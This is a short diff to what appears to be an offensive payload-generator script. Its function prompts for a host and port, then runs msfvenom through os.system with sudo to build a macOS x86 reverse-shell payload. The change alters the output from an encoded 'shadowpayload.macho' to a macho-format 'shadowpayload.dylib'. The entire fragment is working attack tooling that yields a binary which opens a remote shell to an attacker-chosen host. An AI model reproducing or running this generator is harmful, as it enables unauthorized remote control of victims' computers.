@@ -13,7 +13,7 @@ def payloadGenerator(mode):
 	    host = input("──────╼┤HOST├─> ")
 	    port = input("──────╼┤PORT├─> ")
 	    print("\n")
-	    command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -e x86/shikata_ga_nai -o shadowpayload.macho"
+	    command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -f macho -o shadowpayload.dylib"
 	    os.system(command)
         
     elif mode == "2":
